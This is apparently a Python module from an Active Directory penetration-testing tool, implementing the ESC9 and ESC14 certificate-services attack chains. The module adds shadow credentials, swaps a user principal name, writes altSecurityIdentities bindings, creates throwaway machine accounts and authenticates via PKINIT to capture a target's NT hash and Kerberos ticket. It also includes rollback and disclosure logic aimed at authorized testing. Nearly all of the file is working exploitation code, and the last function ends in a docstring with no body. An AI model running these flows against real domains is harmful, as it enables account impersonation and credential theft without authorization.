"""ESC9 (UPN swap) and ESC14 (altSecurityIdentities) exploitation flows."""

from __future__ import annotations

import asyncio
from dataclasses import dataclass
from pathlib import Path
from typing import Optional

from adscan_internal import telemetry
from adscan_internal.rich_output import print_error, print_info, print_success
from adscan_internal.services.adcs.cert_auth import (
    CertAuthConfig,
    authenticate_with_cert_native,
)
from adscan_internal.services.adcs.cert_request import (
    CertRequestConfig,
    request_certificate_native,
)
from adscan_internal.services.adcs.esc_cleanup import (
    esc_rollback_scope,
    mark_revert_failed,
    mark_reverted,
    register_ldap_change,
)
from adscan_internal.services.adcs.esc_types import EscConfig, EscResult
from adscan_internal.services.ldap_transport_service import (
    ADscanLDAPConfig,
    ADscanLDAPConnection,
)
from adscan_internal.services.machine_account_provisioning_service import (
    assess_machine_account_capacity,
    record_machine_account_creation_result,
    register_managed_machine_account,
)
from adscan_core.rich_output import print_exception


def _ldap_cfg(config: EscConfig) -> ADscanLDAPConfig:
    return ADscanLDAPConfig(
        domain=config.auth_domain,
        dc_ip=config.dc_ip,
        username=config.username,
        password=config.effective_secret,
        use_ldaps=True,
        use_kerberos=False,
        kerberos_target_hostname=config.dc_fqdn or None,
    )


@dataclass(frozen=True)
class _DeleteCredential:
    """One credential the ESC14 cleanup may authenticate its delete as.

    ``label`` is operator-facing (it names WHICH principal the attempt ran as, so
    a cascade that falls through is readable in the log); ``config`` is the LDAP
    transport config to open for that attempt.
    """

    label: str
    config: ADscanLDAPConfig


def _privileged_delete_candidate(config: EscConfig) -> Optional[_DeleteCredential]:
    """A stored credential whose principal is VERIFIED privileged, or ``None``.

    Resolved through the credential-store SSOT
    :func:`pick_credential_for_local_admin`, which derives the privilege from the
    canonical AD data ADscan already collected (the account's RID, the
    identity-risk snapshot's Tier-0 reasons) rather than from a group-NAME match,
    and returns only the Domain Admins / Enterprise Admins / RID-500 tiers with
    ``target_host=None``. That is exactly the bar for deleting a computer object,
    and resolving it costs ZERO authentications against the DC (it is a pure read
    of the workspace graph and the in-memory store).

    Never raises: an unreadable store or an uncollected graph degrades to ``None``
    and the caller's cascade continues with its remaining candidates.
    """
    shell = getattr(config, "shell", None)
    if shell is None:
        return None
    try:
        from adscan_internal.services.credentials.privilege_role import (
            CredentialKind,
            pick_credential_for_local_admin,
        )

        picked = pick_credential_for_local_admin(shell, domain=config.domain)
    except Exception as exc:  # noqa: BLE001 — best-effort candidate resolution
        telemetry.capture_exception(exc)
        print_exception(exception=exc)
        return None
    if not picked:
        return None
    username, secret, kind = picked
    if not username or not secret:
        return None
    # A stored secret may still carry the invisible sensitivity markers used to
    # keep it out of telemetry; they must never reach the wire.
    from adscan_core.sensitive import strip_sensitive_markers

    secret = strip_sensitive_markers(secret)
    username = strip_sensitive_markers(username)
    if not username or not secret:
        return None

    common = {
        "domain": config.domain,
        "dc_ip": config.dc_ip,
        "username": username,
        "use_ldaps": True,
        "kerberos_target_hostname": config.dc_fqdn or None,
    }
    if kind is CredentialKind.CCACHE_PATH:
        cfg = ADscanLDAPConfig(use_kerberos=True, ccache_path=secret, **common)
    elif kind in (CredentialKind.AES256_KEY, CredentialKind.AES128_KEY):
        # AES-only domains: the key IS the Kerberos secret (RC4 may be blocked).
        cfg = ADscanLDAPConfig(use_kerberos=True, aes_key=secret, **common)
    else:
        # Password or NT hash — the transport detects the hash form itself and
        # pass-the-hashes rather than treating it as a plaintext password.
        cfg = ADscanLDAPConfig(use_kerberos=False, password=secret, **common)
    return _DeleteCredential(label=f"privileged account {username}", config=cfg)


def _delete_ldap_candidates(
    config: EscConfig, elevated_ccache: Optional[str]
) -> list[_DeleteCredential]:
    """Ordered credentials to try when DELETING an ESC14 machine account.

    The MAQ creator (``config.username``) usually lacks Delete rights on the
    computer account it created, so authenticating the delete as the creator fails
    with ``insufficientAccessRights`` and the account is orphaned. The attack also
    produces a PKINIT ccache for the compromised target, but that target is NOT
    necessarily privileged: ESC14 variant A routinely impersonates an ordinary
    Tier-2 account, and a cleanup that assumes a Domain Admin there orphans the
    machine account exactly as the creator would. So neither credential is assumed
    to work: this returns every credential the SESSION actually holds that could
    plausibly delete the object, strongest evidence first.

    Order, and why:

    1. A stored credential whose principal is VERIFIED privileged
       (:func:`_privileged_delete_candidate`). Preferred first because its
       privilege is evidence-backed, and resolving it costs no authentication.
    2. The compromised target's PKINIT ccache. Kept in the cascade because when
       the target IS privileged this is the cheapest correct option (the ticket is
       already minted, so no new secret reaches the wire), and because when no
       collection has graded the principals it is the only elevated material in
       hand.
    3. The machine-account creator. Last, because it is the one we know usually
       lacks the right; it stays so a session with no other credential behaves
       exactly as before.

    Worst case this costs THREE binds, each with a credential ADscan already holds
    and has already authenticated with in this session (the creator just created
    the account; the privileged credential was captured or validated; the ccache
    was just minted). None is a guess, so no attempt can increment ``badPwdCount``
    or move an account toward lockout. This is a bounded cleanup, not a sweep: the
    credential set is never iterated.
    """
    candidates: list[_DeleteCredential] = []
    seen: set[tuple[str, str]] = set()

    def _add(candidate: Optional[_DeleteCredential]) -> None:
        if candidate is None:
            return
        key = (
            str(candidate.config.username or "").lower(),
            str(candidate.config.ccache_path or ""),
        )
        if key in seen:
            return
        seen.add(key)
        candidates.append(candidate)

    _add(_privileged_delete_candidate(config))
    if elevated_ccache:
        _add(
            _DeleteCredential(
                label=f"compromised target {config.target_account}",
                config=ADscanLDAPConfig(
                    domain=config.domain,
                    dc_ip=config.dc_ip,
                    username=config.target_account,
                    use_ldaps=True,
                    use_kerberos=True,
                    ccache_path=elevated_ccache,
                    kerberos_target_hostname=config.dc_fqdn or None,
                ),
            )
        )
    _add(
        _DeleteCredential(
            label=f"machine account creator {config.username}",
            config=_ldap_cfg(config),
        )
    )
    return candidates


def _manual_machine_account_instructions(
    computer_name: str, computer_dn: str
) -> str:
    """Manual-cleanup disclosure for a machine account ADscan could not delete.

    Names the exact object and the native command a privileged administrator runs
    to remove it, rendered from the cleanup-taxonomy SSOT so the wording matches
    every other machine-account disclosure in the ledger.
    """
    from adscan_internal.services import cleanup_taxonomy as _tax

    command = _tax.MANUAL_MACHINE_ACCOUNT.replace(
        "TARGET", computer_name or computer_dn
    )
    return f"{command}\n  Object: {computer_dn}"


async def _delete_machine_account_with_cascade(
    config: EscConfig,
    *,
    computer_name: str,
    computer_dn: str,
    change_id: Optional[str],
    elevated_ccache: Optional[str] = None,
) -> bool:
    """Delete an ESC14-created machine account, trying each held credential once.

    Returns True once the object is gone. When NO credential can delete it the
    ledger entry stays ``manual_required`` (never "reverted") and carries the
    exact object plus the native command a privileged administrator runs. That
    disclosure is the legally-critical floor: an unreverted change that is
    disclosed is correct, one quietly dropped is not.
    """
    last_error: Optional[str] = None
    for candidate in _delete_ldap_candidates(config, elevated_ccache):

        def _do_delete(delete_cfg: ADscanLDAPConfig = candidate.config) -> bool:
            with ADscanLDAPConnection(delete_cfg) as conn:
                return conn.delete(computer_dn)

        try:
            ok = await asyncio.to_thread(_do_delete)
        except Exception as exc:  # noqa: BLE001 — try the next credential
            telemetry.capture_exception(exc)
            print_exception(exception=exc)
            last_error = str(exc)
            print_info(
                f"ESC14: delete as {candidate.label} failed ({exc}); "
                "trying the next available credential..."
            )
            continue
        if ok:
            mark_reverted(config.shell, change_id)
            print_success(
                f"ESC14: computer {computer_name} deleted as {candidate.label}."
            )
            return True
        last_error = "LDAP delete returned False"
        print_info(
            f"ESC14: delete as {candidate.label} did not remove the object; "
            "trying the next available credential..."
        )

    mark_revert_failed(
        config.shell,
        change_id,
        error=(
            last_error
            or "No available credential held Delete rights on the computer object."
        ),
        instructions=_manual_machine_account_instructions(
            computer_name, computer_dn
        ),
    )
    print_error(
        f"ESC14: could not delete computer {computer_name} with any credential "
        "this session holds. Manual cleanup required (disclosed in the "
        "environment-change ledger)."
    )
    return False


def _output_dir(config: EscConfig) -> Path:
    d = Path(config.workspace_dir or "/tmp") / "adcs" / f"esc{config.esc}"
    d.mkdir(parents=True, exist_ok=True)
    return d


def _read_upn(conn: ADscanLDAPConnection, account_dn: str) -> Optional[str]:
    conn.search(
        search_base=account_dn,
        search_filter="(objectClass=*)",
        attributes=["userPrincipalName"],
        search_scope="BASE",
    )
    if not conn.entries:
        return None
    raw = conn.entries[0].entry_raw_attributes.get("userPrincipalName") or []
    if not raw:
        return None
    v = raw[0]
    return v.decode() if isinstance(v, bytes) else str(v)


def _set_upn(conn: ADscanLDAPConnection, account_dn: str, upn: str) -> bool:
    return conn.modify(account_dn, {"userPrincipalName": [("replace", [upn])]})


def _read_attribute(
    conn: ADscanLDAPConnection, account_dn: str, attribute: str
) -> Optional[str]:
    """Read a single-valued string attribute of ``account_dn`` (``None`` if absent)."""
    conn.search(
        search_base=account_dn,
        search_filter="(objectClass=*)",
        attributes=[attribute],
        search_scope="BASE",
    )
    if not conn.entries:
        return None
    raw = conn.entries[0].entry_raw_attributes.get(attribute) or []
    if not raw:
        return None
    value = raw[0]
    return value.decode() if isinstance(value, bytes) else str(value)


def _replace_attribute(
    conn: ADscanLDAPConnection, account_dn: str, attribute: str, value: str
) -> bool:
    """Set ``attribute`` of ``account_dn`` to ``value`` (single-value replace)."""
    return bool(conn.modify(account_dn, {attribute: [("replace", [value])]}))


def _restore_attribute(
    conn: ADscanLDAPConnection,
    account_dn: str,
    attribute: str,
    original_value: Optional[str],
) -> bool:
    """Restore ``attribute`` to its snapshot — replace the original, or delete it."""
    if original_value is not None:
        return bool(conn.modify(account_dn, {attribute: [("replace", [original_value])]}))
    return bool(conn.modify(account_dn, {attribute: [("delete", [])]}))


def _add_shadow_creds(config: EscConfig):
    """Add shadow credentials to target_account and return NT hash via PKINIT."""
    from adscan_internal.services.adcs.shadow_credentials import (
        add_shadow_credentials_native,
    )

    return add_shadow_credentials_native(
        dc_ip=config.dc_ip,
        domain=config.auth_domain,
        username=config.username,
        password=config.effective_secret or "",
        target_account=config.target_account,
    )


def _remove_shadow_creds(config: EscConfig) -> None:
    from adscan_internal.services.adcs.shadow_credentials import (
        remove_shadow_credentials_native,
    )

    try:
        remove_shadow_credentials_native(
            dc_ip=config.dc_ip,
            domain=config.auth_domain,
            username=config.username,
            password=config.effective_secret or "",
            target_account=config.target_account,
        )
    except Exception as exc:
        telemetry.capture_exception(exc)
        print_exception(exception=exc)


async def _add_computer(ldap_cfg: ADscanLDAPConfig):
    """Deferred wrapper around add_computer_native to allow test patching."""
    from adscan_internal.services.exploitation.delegation_native import (
        add_computer_native,
    )

    return await add_computer_native(ldap_config=ldap_cfg)


async def run_esc9(config: EscConfig) -> EscResult:
    """ESC9: shadow creds on target -> get NT hash -> swap UPN -> request cert -> restore UPN."""
    out = _output_dir(config)
    ldap_cfg = _ldap_cfg(config)

    # Step 1: Add shadow credentials to get the target's NT hash
    shadow = await asyncio.to_thread(_add_shadow_creds, config)
    if not getattr(shadow, "success", False):
        inner = getattr(shadow, "error", None) or "operation failed"
        return EscResult(
            success=False,
            esc=9,
            error=f"shadow credentials failed: {inner}",
        )

    sc_change_id = register_ldap_change(
        config.shell,
        kind="shadow_credentials_added",
        domain=config.domain,
        target=config.target_account,
        detail={"target": config.target_account, "exec_user": config.username},
        method="ADCSESC9 — shadow credentials",
    )

    nt_hash = getattr(shadow, "nt_hash", None)

    upn_restored = False
    shadow_removed = False

    async with esc_rollback_scope() as rb:

        async def _rm_shadow() -> None:
            nonlocal shadow_removed
            if shadow_removed:
                return
            print_info(
                f"ESC9: removing shadow credentials from {config.target_account}..."
            )
            try:
                await asyncio.to_thread(_remove_shadow_creds, config)
                shadow_removed = True
                mark_reverted(config.shell, sc_change_id)
                print_success("ESC9: shadow credentials removed.")
            except Exception as exc:
                telemetry.capture_exception(exc)
                print_exception(exception=exc)
                mark_revert_failed(
                    config.shell,
                    sc_change_id,
                    error=str(exc),
                    instructions=(
                        f"Manually clear msDS-KeyCredentialLink on {config.target_account_dn}"
                    ),
                )
                print_error(f"ESC9: failed to remove shadow creds: {exc}")

        rb.add(_rm_shadow)

        # Step 2: Read current UPN so we can restore it
        def _get_upn() -> Optional[str]:
            with ADscanLDAPConnection(ldap_cfg) as conn:
                return _read_upn(conn, config.target_account_dn)

        original_upn = await asyncio.to_thread(_get_upn)
        # original_upn may be None if the account has no UPN set — that's OK,
        # we'll set it and restore to empty on rollback.

        upn_change_id = register_ldap_change(
            config.shell,
            kind="upn_changed",
            domain=config.domain,
            target=config.target_account,
            detail={
                "original_upn": original_upn,
                "new_upn": config.target_upn,
                "dn": config.target_account_dn,
            },
            method="ADCSESC9 — UPN manipulation",
        )

        async def _restore_upn() -> None:
            nonlocal upn_restored
            if upn_restored:
                return
            _upn_display = repr(original_upn) if original_upn else "(none)"
            print_info(
                f"ESC9: restoring UPN of {config.target_account} -> {_upn_display}..."
            )

            def _do_restore() -> bool:
                with ADscanLDAPConnection(ldap_cfg) as c2:
                    if original_upn:
                        return _set_upn(c2, config.target_account_dn, original_upn)
                    # No original UPN — delete the attribute
                    return bool(
                        c2.modify(
                            config.target_account_dn,
                            {"userPrincipalName": [("delete", [])]},
                        )
                    )

            ok = await asyncio.to_thread(_do_restore)
            if ok:
                upn_restored = True
                mark_reverted(config.shell, upn_change_id)
                print_success("ESC9: UPN restored.")
            else:
                mark_revert_failed(
                    config.shell,
                    upn_change_id,
                    error="LDAP modify failed",
                    instructions=(
                        f"Manually set userPrincipalName={original_upn} on {config.target_account_dn}"
                    ),
                )
                print_error("ESC9: UPN restore failed (manual cleanup required).")

        rb.add(_restore_upn)

        # Step 3: Swap UPN to target's value so the cert embeds the target identity
        print_info(
            f"ESC9: changing {config.target_account} UPN -> {config.target_upn}..."
        )

        def _set_target_upn() -> bool:
            with ADscanLDAPConnection(ldap_cfg) as conn:
                return _set_upn(conn, config.target_account_dn, config.target_upn)

        ok = await asyncio.to_thread(_set_target_upn)
        if not ok:
            raise RuntimeError(f"Failed to set UPN on {config.target_account_dn}")

        # Step 4: Request certificate — authenticate as target_account using NT hash
        _esc9_key_size = getattr(config, "min_key_size", None)
        req_cfg = CertRequestConfig(
            domain=config.auth_domain,
            kdc_ip=config.auth_kdc,
            ca_host=config.ca_host,
            ca_name=config.ca_name,
            template=config.template or "User",
            username=config.target_account,
            nt_hash=nt_hash,
            ca_fqdn=config.ca_fqdn,
            auth_domain=config.auth_domain,
            target_domain=config.domain,
            auth_kdc_ip=config.auth_kdc,
            target_kdc_ip=config.dc_ip,
            dns_server=config.dns_server,
            ledger_shell=config.shell,
            ledger_domain=config.domain,
            ledger_technique="ADCSESC9: certificate enrollment under the swapped UPN",
            **({} if _esc9_key_size is None else {"key_size": int(_esc9_key_size)}),
        )
        req = await request_certificate_native(req_cfg, out)
        if not req.success:
            await _restore_upn()
            await _rm_shadow()
            return EscResult(
                success=False,
                esc=9,
                error=f"Certificate request failed: {req.error}",
                rollback_ok=upn_restored,
            )

        # Step 5: Restore before PKINIT so environment is clean regardless of outcome
        await _restore_upn()
        await _rm_shadow()

        # Step 6: PKINIT with the obtained cert to get the target's hash
        auth_cfg = CertAuthConfig(
            domain=config.domain,
            kdc_ip=config.dc_ip,
            pfx_path=req.pfx_path,
            pfx_password=req.pfx_password or "",
            username=config.target_upn.split("@")[0] if config.target_upn else None,
        )
        auth = await authenticate_with_cert_native(auth_cfg, out)
        if not auth.success:
            if getattr(auth, "certificate_binding_refused", False):
                # The DC enforces strong certificate binding (KB5014754): ESC9's
                # premise (a no-SID certificate implicitly mapped by UPN) is
                # refused. This is the mitigation working, so it is an honest
                # HARDENED positive control, not a failed attempt — mirror the
                # ESC15 confirm vocabulary (evidence verdict "hardened").
                return EscResult(
                    success=False,
                    esc=9,
                    error=auth.error or "PKINIT refused by strong certificate binding",
                    rollback_ok=upn_restored,
                    evidence={
                        "verdict": "hardened",
                        "certificate_binding_refused": True,
                        "reason": auth.error
                        or "the domain controller enforces strong certificate binding",
                    },
                )
            return EscResult(
                success=False,
                esc=9,
                error=auth.error or "PKINIT failed",
                rollback_ok=upn_restored,
            )

        print_success(f"ESC9: NT hash obtained — {auth.nt_hash}")
        from adscan_internal.services.adcs.esc_enrollment import _emit_pkinit_compromise

        _emit_pkinit_compromise(config, auth.nt_hash)
        return EscResult(
            success=True,
            esc=9,
            nt_hash=auth.nt_hash,
            ccache_path=str(auth.ccache_path) if auth.ccache_path else None,
            pfx_path=str(req.pfx_path),
        )


def compute_x509_issuer_serial(cert_der: bytes) -> str:
    """Compute X509IssuerSerialNumber binding value for altSecurityIdentities.

    Format: ``X509:<I>issuer_root_first<SR>hex_serial_reversed``

    Windows ``altSecurityIdentities`` X509IssuerSerialNumber requires the issuer
    distinguished name in **root-first (DER / forward) order** — the root RDN
    first, the leaf (CN) last (e.g. ``DC=local,DC=essos,CN=ESSOS-CA``). This is the
    REVERSE of ``Name.rfc4514_string()``, which renders leaf-first per RFC 4514 and
    the KDC rejects with ``KDC_ERR_CLIENT_NAME_MISMATCH`` (code 75). We therefore
    render the issuer by joining each RDN in the certificate's native DER order
    (``cert.issuer.rdns``) directly, rather than ``rfc4514_string()``. Each RDN is
    rendered via its own ``rfc4514_string()`` so values containing escaped commas
    stay correctly escaped — a naive ``split(',')`` on the whole-DN string would
    corrupt them. The serial stays little-endian (unchanged) and case is left as-is
    (AD matches the issuer DN case-insensitively).

    Args:
        cert_der: DER-encoded X.509 certificate bytes.

    Returns:
        The altSecurityIdentities binding string.
    """
    from cryptography import x509 as _x509

    cert = _x509.load_der_x509_certificate(cert_der)
    # cert.issuer.rdns is the native DER order (root-first for a real CA cert);
    # rfc4514_string() reverses it to leaf-first, which the KDC refuses. Render each
    # RDN individually (preserving per-value escaping) and keep the DER order.
    issuer_root_first = ",".join(
        rdn.rfc4514_string() for rdn in cert.issuer.rdns
    )
    serial_bytes = cert.serial_number.to_bytes(
        (cert.serial_number.bit_length() + 7) // 8, "big"
    )
    serial_hex = serial_bytes[::-1].hex().upper()
    return f"X509:<I>{issuer_root_first}<SR>{serial_hex}"


def _resolve_sid(ldap_cfg: "ADscanLDAPConfig", target_account: str) -> Optional[str]:
    """Look up the objectSid of the target account for embedding in the cert."""
    try:
        with ADscanLDAPConnection(ldap_cfg) as conn:
            conn.search(
                search_base=conn.domain_dn,
                search_filter=f"(sAMAccountName={target_account})",
                attributes=["objectSid"],
            )
            if not conn.entries:
                return None
            raw_sid = conn.entries[0].entry_raw_attributes.get("objectSid") or []
            if not raw_sid or not isinstance(raw_sid[0], bytes):
                return None
            from adscan_internal.services.writable_attribute_discovery_service import (
                _sid_bytes_to_str,
            )

            return _sid_bytes_to_str(raw_sid[0]) or None
    except Exception:  # noqa: BLE001
        return None


async def run_esc14(config: EscConfig) -> EscResult:
    """ESC14 dispatch: variant A writes the target; B/C/D satisfy an existing mapping.

    * Variant A (default) — a controlling principal writes a strong binding onto
      the TARGET's altSecurityIdentities and enrolls a certificate it controls.
    * Variants B/C/D — the target ALREADY carries a weak explicit mapping
      (email / issuer+subject / subject-only). ADscan creates a controlled victim
      machine account, sets its ``mail`` / ``cn`` / ``dNSHostName`` to satisfy that
      mapping, enrolls as the victim, and the domain controller maps the issued
      certificate to the target. Delegated to :func:`run_esc14_weak_mapping`.
    """
    variant = str(getattr(config, "esc14_variant", "A") or "A").strip().upper()
    if variant in {"B", "C", "D"}:
        return await run_esc14_weak_mapping(config)
    return await _run_esc14_write_access(config)


async def _run_esc14_write_access(config: EscConfig) -> EscResult:
    """ESC14 variant A: create computer -> request Machine cert with target SID -> altSecId -> PKINIT."""
    out = _output_dir(config)
    ldap_cfg = _ldap_cfg(config)

    print_info("ESC14: creating machine account...")
    # assess_machine_account_capacity opens a SYNC ADscanLDAPConnection, which drives
    # its own new_event_loop().run_until_complete(). This executor already runs inside
    # an asyncio loop (run_esc_sync -> run_async_sync -> asyncio.run), so calling it
    # inline raises a nested-loop RuntimeError. Offload it to a worker thread with no
    # running loop of its own (same pattern as the delete/clear/write below).
    capacity = await asyncio.to_thread(
        lambda: assess_machine_account_capacity(
            ldap_config=ldap_cfg,
            actor_username=config.username,
            shell=config.shell,
        )
    )
    if capacity.can_create is False:
        return EscResult(
            success=False,
            esc=14,
            error=capacity.blocked_reason
            or "MachineAccountQuota does not allow creating a machine account",
        )
    computer_result = await _add_computer(ldap_cfg)
    if not computer_result.success:
        record_machine_account_creation_result(
            config.shell,
            domain=config.domain,
            actor_username=config.username,
            success=False,
            quota_exceeded=bool(getattr(computer_result, "quota_exceeded", False)),
            reason=computer_result.error or "MachineAccountQuota exceeded for actor.",
        )
        return EscResult(
            success=False,
            esc=14,
            error=computer_result.error or "addcomputer failed",
        )

    computer_name: str = computer_result.computer_name or ""
    computer_password: str = computer_result.password or ""
    computer_dn: str = computer_result.dn or ""
    record_machine_account_creation_result(
        config.shell,
        domain=config.domain,
        actor_username=config.username,
        success=True,
    )
    register_managed_machine_account(
        config.shell,
        domain=config.domain,
        sam_account_name=computer_name,
        password=computer_password,
        dn=computer_dn,
        created_by=config.username,
        source="adcs_esc14",
    )

    comp_change_id = register_ldap_change(
        config.shell,
        kind="computer_account_created",
        domain=config.domain,
        target=computer_name,
        detail={"computer_name": computer_name, "dn": computer_dn},
        method="ADCSESC14 — computer account creation",
    )

    computer_deleted = False
    altsec_cleared = False
    # Set after PKINIT succeeds: the impersonated target's ccache. It is ONE of the
    # credentials the delete cascade may authenticate as, not a privileged one by
    # assumption (variant A routinely impersonates an ordinary Tier-2 account) —
    # see :func:`_delete_ldap_candidates`.
    elevated_delete_ccache: Optional[str] = None

    async with esc_rollback_scope() as rb:

        async def _delete_computer() -> None:
            nonlocal computer_deleted
            if computer_deleted:
                return
            print_info(f"ESC14: deleting computer account {computer_name}...")
            if await _delete_machine_account_with_cascade(
                config,
                computer_name=computer_name,
                computer_dn=computer_dn,
                change_id=comp_change_id,
                elevated_ccache=elevated_delete_ccache,
            ):
                computer_deleted = True

        rb.add(_delete_computer)

        # Step 2: Resolve target SID for embedding in cert (Strong Certificate Binding support).
        target_sid = await asyncio.to_thread(
            _resolve_sid, ldap_cfg, config.target_account
        )

        # Step 3: Request Machine certificate for the new computer account.
        # ESC14 variant A is defined by the strong altSecurityIdentities binding we
        # write on the target, NOT a SAN UPN. A SAN UPN would make the KDC map the
        # certificate by implicit UPN (ESC1-style) and ignore the binding entirely —
        # on a group terminal that is KDC_ERR_C_PRINCIPAL_UNKNOWN. So enroll with NO
        # SAN UPN; the SID is kept (it is the target's own SID) so PKINIT still works
        # on patched DCs that enforce Strong Certificate Binding.
        print_info(f"ESC14: requesting Machine certificate for {computer_name}...")
        _esc14_key_size = getattr(config, "min_key_size", None)
        req_cfg = CertRequestConfig(
            domain=config.auth_domain,
            kdc_ip=config.auth_kdc,
            ca_host=config.ca_host,
            ca_name=config.ca_name,
            template="Machine",
            username=computer_name,
            password=computer_password,
            ca_fqdn=config.ca_fqdn,
            upn="",
            sid=target_sid,
            dns_server=config.dns_server,
            ledger_shell=config.shell,
            ledger_domain=config.domain,
            ledger_technique="ADCSESC14: machine certificate enrollment",
            **({} if _esc14_key_size is None else {"key_size": int(_esc14_key_size)}),
        )
        req = await request_certificate_native(req_cfg, out)
        if not req.success:
            raise RuntimeError(f"Machine cert request failed: {req.error}")

        # Step 3: Compute altSecurityIdentities binding value from the cert
        from cryptography.hazmat.primitives.serialization import Encoding
        from cryptography.hazmat.primitives.serialization.pkcs12 import load_pkcs12

        pfx_bytes = req.pfx_path.read_bytes()
        pfx_data = load_pkcs12(pfx_bytes, (req.pfx_password or "").encode())
        cert_der = pfx_data.cert.certificate.public_bytes(Encoding.DER)
        binding_value = compute_x509_issuer_serial(cert_der)
        print_info(f"ESC14: computed binding value: {binding_value[:60]}...")

        altsec_change_id = register_ldap_change(
            config.shell,
            kind="altsecurityidentities_written",
            domain=config.domain,
            target=config.target_account,
            detail={"target_dn": config.target_account_dn, "binding": binding_value},
            method="ADCSESC14 — altSecurityIdentities write",
        )

        async def _clear_altsec() -> None:
            nonlocal altsec_cleared
            if altsec_cleared:
                return
            print_info(
                f"ESC14: clearing altSecurityIdentities on {config.target_account}..."
            )

            def _do_clear() -> bool:
                with ADscanLDAPConnection(ldap_cfg) as conn:
                    return conn.modify(
                        config.target_account_dn,
                        {"altSecurityIdentities": [("delete", [binding_value])]},
                    )

            ok = await asyncio.to_thread(_do_clear)
            if ok:
                altsec_cleared = True
                mark_reverted(config.shell, altsec_change_id)
                print_success("ESC14: altSecurityIdentities cleared.")
            else:
                mark_revert_failed(
                    config.shell,
                    altsec_change_id,
                    error="LDAP modify failed",
                    instructions=(
                        f"Manually remove {binding_value} from altSecurityIdentities "
                        f"on {config.target_account_dn}"
                    ),
                )
                print_error("ESC14: failed to clear altSecurityIdentities.")

        rb.add(_clear_altsec)

        # Step 4: Write the binding value to the target's altSecurityIdentities
        def _write_altsec() -> bool:
            with ADscanLDAPConnection(ldap_cfg) as conn:
                return conn.modify(
                    config.target_account_dn,
                    {"altSecurityIdentities": [("add", [binding_value])]},
                )

        ok = await asyncio.to_thread(_write_altsec)
        if not ok:
            raise RuntimeError(
                f"Failed to write altSecurityIdentities on {config.target_account_dn}"
            )

        # Step 5: PKINIT as the target account using the machine cert
        auth_cfg = CertAuthConfig(
            domain=config.domain,
            kdc_ip=config.dc_ip,
            pfx_path=req.pfx_path,
            pfx_password=req.pfx_password or "",
            username=config.target_account,
        )
        auth = await authenticate_with_cert_native(auth_cfg, out)
        if not auth.success:
            raise RuntimeError(f"PKINIT failed: {auth.error}")

        # The attack now holds the impersonated target's TGT ccache. The cleanup
        # cascade tries it alongside any verified-privileged credential the session
        # holds, since the target itself may be unprivileged.
        elevated_delete_ccache = str(auth.ccache_path) if auth.ccache_path else None

        # Step 6: Clean up — delete computer and clear altSecurityIdentities
        await _delete_computer()
        await _clear_altsec()

        print_success(f"ESC14: NT hash obtained — {auth.nt_hash}")
        from adscan_internal.services.adcs.esc_enrollment import _emit_pkinit_compromise

        _emit_pkinit_compromise(config, auth.nt_hash)
        return EscResult(
            success=True,
            esc=14,
            nt_hash=auth.nt_hash,
            ccache_path=str(auth.ccache_path) if auth.ccache_path else None,
            pfx_path=str(req.pfx_path),
        )


async def run_esc14_weak_mapping(config: EscConfig) -> EscResult:
    """ESC14 variants B/C/D: satisfy a target's EXISTING weak explicit mapping.

    The target already carries a weak ``altSecurityIdentities`` mapping (email,
    issuer+subject, or subject-only). ADscan does NOT touch the target: it creates
    a controlled victim machine account, sets the victim's ``mail`` (B) / ``cn``
    (C) / ``dNSHostName`` (D) to the value the mapping matches, enrolls a
    certificate as the victim, and the domain controller maps the issued
    certificate to the target — authenticating as the target.

    Every destructive write is on the throwaway victim and is reversible:

    * the victim attribute is SNAPSHOTTED before the write and RESTORED on success
      AND failure (and the victim account is deleted), both through the ledger;
    * a revert that cannot be verified is disclosed ``manual_required`` with the
      exact native command, never left silent.
    """
    variant = str(config.esc14_variant or "").strip().upper()
    attribute = str(config.esc14_victim_attribute or "").strip()
    match_value = str(config.esc14_match_value or "").strip()
    if not attribute or not match_value:
        return EscResult(
            success=False,
            esc=14,
            error=(
                f"ESC14 variant {variant}: missing victim attribute / match value "
                "(re-run collection to resolve the weak mapping)."
            ),
        )

    out = _output_dir(config)
    ldap_cfg = _ldap_cfg(config)

    print_info(
        f"ESC14 variant {variant}: creating controlled victim machine account..."
    )
    # Offload the sync capacity probe off the running loop (see the variant-A note):
    # it opens a sync ADscanLDAPConnection that drives its own event loop.
    capacity = await asyncio.to_thread(
        lambda: assess_machine_account_capacity(
            ldap_config=ldap_cfg,
            actor_username=config.username,
            shell=config.shell,
        )
    )
    if capacity.can_create is False:
        return EscResult(
            success=False,
            esc=14,
            error=capacity.blocked_reason
            or "MachineAccountQuota does not allow creating a victim machine account",
        )
    computer_result = await _add_computer(ldap_cfg)
    if not computer_result.success:
        record_machine_account_creation_result(
            config.shell,
            domain=config.domain,
            actor_username=config.username,
            success=False,
            quota_exceeded=bool(getattr(computer_result, "quota_exceeded", False)),
            reason=computer_result.error or "MachineAccountQuota exceeded for actor.",
        )
        return EscResult(
            success=False, esc=14, error=computer_result.error or "addcomputer failed"
        )

    victim_name: str = computer_result.computer_name or ""
    victim_password: str = computer_result.password or ""
    victim_dn: str = computer_result.dn or ""
    record_machine_account_creation_result(
        config.shell,
        domain=config.domain,
        actor_username=config.username,
        success=True,
    )
    register_managed_machine_account(
        config.shell,
        domain=config.domain,
        sam_account_name=victim_name,
        password=victim_password,
        dn=victim_dn,
        created_by=config.username,
        source="adcs_esc14",
    )

    comp_change_id = register_ldap_change(
        config.shell,
        kind="computer_account_created",
        domain=config.domain,
        target=victim_name,
        detail={"computer_name": victim_name, "dn": victim_dn},
        method=f"ADCSESC14 variant {variant} — victim machine account creation",
    )

    try:
        return await _run_esc14_weak_mapping_scoped(
            config,
            out=out,
            ldap_cfg=ldap_cfg,
            variant=variant,
            attribute=attribute,
            match_value=match_value,
            victim_name=victim_name,
            victim_password=victim_password,
            victim_dn=victim_dn,
            comp_change_id=comp_change_id,
        )
    except Exception as exc:  # noqa: BLE001 — rollbacks already ran in the scope
        telemetry.capture_exception(exc)
        print_exception(exception=exc)
        return EscResult(
            success=False,
            esc=14,
            error=f"ESC14 variant {variant}: {exc}",
            evidence={"esc14_variant": variant},
        )


async def _run_esc14_weak_mapping_scoped(
    config: EscConfig,
    *,
    out: Path,
    ldap_cfg: ADscanLDAPConfig,
    variant: str,
    attribute: str,
    match_value: str,
    victim_name: str,
    victim_password: str,
    victim_dn: str,
    comp_change_id: Optional[str],
) -> EscResult:
    """The B/C/D rollback-scoped body (see :func:`run_esc14_weak_mapping`).

    Split out so the caller can convert a mid-chain failure (raised after the
    rollback scope has already restored the victim attribute and deleted the
    victim) into an honest failed :class:`EscResult`, which lets the attack-path
    executor fall back to the next confirmed variant instead of aborting.
    """
